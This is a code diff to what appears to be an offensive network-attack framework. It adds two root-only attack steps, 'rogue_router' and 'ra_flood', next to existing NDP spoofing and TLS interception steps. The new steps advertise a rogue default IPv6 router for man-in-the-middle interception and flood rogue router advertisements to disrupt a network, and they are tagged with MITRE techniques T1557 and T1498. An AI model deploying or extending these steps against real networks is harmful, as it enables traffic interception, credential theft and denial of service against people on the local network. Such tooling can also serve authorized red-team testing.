@@ -159,6 +159,24 @@ def s_ndp(ctx, p):
     ctx.event("ndp_spoof", f"{p['target']} -> {p['our_mac']}")
 
 
+@step("rogue_router", needs_root=True, attack="T1557")
+def s_rogue_router(ctx, p):
+    from reforge.attacks.ndp import RogueRouter
+
+    r = RogueRouter(p["iface"], p["our_mac"], prefix=p.get("prefix", "2001:db8:dead::"))
+    r.start(); ctx.add_background(r)
+    ctx.event("rogue_router", f"advertising {r.prefix} as default IPv6 router")
+
+
+@step("ra_flood", needs_root=True, attack="T1498")
+def s_ra_flood(ctx, p):
+    from reforge.attacks.ndp import RaFlood
+
+    r = RaFlood(p["iface"], rate=p.get("rate", 400), batch=p.get("batch", 50))
+    r.start(); ctx.add_background(r)
+    ctx.event("ra_flood", f"flooding rogue RAs on {p['iface']}")
+
+
 @step("tls_intercept", needs_root=True, attack="T1557")
 def s_tls(ctx, p):
     from reforge.attacks.tls_proxy import TlsInterceptor
